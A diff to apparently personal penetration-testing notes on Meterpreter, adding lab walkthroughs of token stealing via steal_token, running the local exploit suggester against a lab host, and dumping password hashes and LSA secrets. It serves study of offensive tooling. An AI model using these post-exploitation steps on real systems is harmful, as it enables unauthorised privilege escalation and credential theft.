@@ -64,5 +64,108 @@ Meterpreter uses a mix of linux & windows syntax command for faster interactions
 - *close* : close a channel
 - *exit* / *quit* : terminate the [[Metasploit#Sessions|session]]
 - *guid* : get the GUID for the current session
+- *getuid* : gets the current user
 - *secure* : (Re)negotiate TLV packet encryption on the session
-- *db_nmap* : run nmap storing the results automatically in the [[Metasploit#Using databases in Metasploit|metasploit database]]
+
+### Process Migration
+In a situation where we don't have permissions, we might be able to migrate to a process with a different user:
+```
+meterpreter > getuid
+
+[-] 1055: Operation failed: Access is denied
+
+
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name               Arch  Session  User                          Path
+ ---   ----  ----               ----  -------  ----                          ----
+ 0     0     [System Process]                                                
+ 4     0     System                                                          
+ 216   1080  cidaemon.exe                                                    
+ 272   4     smss.exe                                                        
+ 292   1080  cidaemon.exe                                                    
+<...SNIP...>
+
+ 1712  396   alg.exe                                                         
+ 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
+ 1920  396   dllhost.exe                                                     
+ 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe
+ 2312  592   wmiprvse.exe                                                    
+ 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
+ 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
+ 4076  1080  cidaemon.exe                                                    
+
+
+meterpreter > steal_token 1836
+
+Stolen token with username: NT AUTHORITY\NETWORK SERVICE
+
+
+meterpreter > getuid
+
+Server username: NT AUTHORITY\NETWORK SERVICE
+```
+
+### Using a  meterpreter session in a module
+Lets say we need the local exploit suggester module, it can be run by backgrounding the session, finding the module, and configuring its options to run for the session we have established.
+```
+meterpreter > bg
+
+Background session 1? [y/N]  y
+
+
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+
+
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
+msf6 post(multi/recon/local_exploit_suggester) > show options
+
+Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION                           yes       The session to run this module on
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+
+
+msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
+
+SESSION => 1
+
+
+msf6 post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.10.10.15 - Collecting local exploits for x86/windows...
+[*] 10.10.10.15 - 34 exploit checks are being tried...
+nil versions are discouraged and will be deprecated in Rubygems 4
+[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Post module execution completed
+msf6 post(multi/recon/local_exploit_suggester) > 
+```
+
+### Dumping Hashes
+```sh
+# Dumps users, IDs, and hashes
+hashdump
+
+# Dumps SAM (Security Account Manager) db
+lsa_dump_sam
+
+# Dumps LSA (Local Security Authority) secrets
+lsa_dump_secrets
+```
